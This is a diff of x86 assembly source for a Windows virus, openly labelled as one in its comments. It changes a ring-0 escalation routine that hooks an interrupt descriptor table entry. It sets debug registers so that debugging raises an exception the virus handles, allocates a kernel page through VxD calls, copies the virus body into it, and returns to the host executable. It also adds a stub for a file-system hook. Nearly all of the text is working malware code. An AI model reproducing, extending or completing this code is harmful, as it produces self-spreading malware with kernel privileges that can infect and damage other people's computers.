@@ -178,22 +178,30 @@ add ebx, HookExceptionNumber*08h+04h
 
 cli
 
-mov ebp, [ebx]
-mov bp, [ebx-04h]
+mov dword ebp, [ebx]
+mov word bp, [ebx-04h]
 
 lea esi, [ecx+(IntHandler-ExceptionOccured)] ; ESI = Memory adress of 
                                              ; ExceptionOccured+(IntHandler-ExceptionOccured)
 push esi
-mov [ebx-04h], si
+mov word [ebx-04h], si
 shr esi, 16
-mov [ebx+2h], si
+mov word [ebx+2h], si
 pop esi
 
-
+sti
 
 int HookExceptionNumber    ; To get ring 0
 
-
+;*************************************
+;* This code is saved for a later date
+;* sub edi, VirusSize
+;* xchg eax, edi
+;* lea esi, [eax+(IntHandler-virus_start)] ; ESI = Adress of handler in new page
+;* mov word [ebx-04h], si
+;* shr esi, 16
+;* mov word [ebx+02h], si
+;**************************************
 
 
 ExceptionOccured:
@@ -201,18 +209,25 @@ ExceptionOccured:
 RestoreSEH:
 pop dword [fs:0]
 add esp, 4
+pop ebp
+push 00401000h
+ret                ; Return to original EXE
 
 IntHandler:
 mov ecx, dr3
 jcxz AllocateSysPage
+
+jmp InstallFSHook
 iretd
 
 AllocateSysPage:
+push ebx
 mov ebx, 'Free'
 mov dr3, ebx
 mov ebx, dr7
 or ebx, 00002080h  ; Hehe, if anyone tries to debug my virus, it will throw an exception
 mov dr7, ebx       ; And then I, can handle it
+pop ebx
 
 push 00000008h
 push ecx
@@ -226,13 +241,17 @@ int 20h
 dd 00010053h     ; eax=adress of allocated page
 add esp, 08h*04h  ; Stack Cleanup
 
-mov esi, virus_start
-mov edi, eax
+xchg edi, eax     ; EDI = Base Adress of Allocated page
+lea eax, [esi+(virus_start-IntHandler)] ; EAX = Start of Virus
+xchg eax, esi     ; SI = start of virus
 mov ecx, VirusSize
 
 rep movsb
 iretd             ; Return to ring 3
 
+InstallFSHook:
+
+
 virus_end:
-VirusSize equ $
+VirusSize equ $-virus_start
 _SizeOfCode equ $
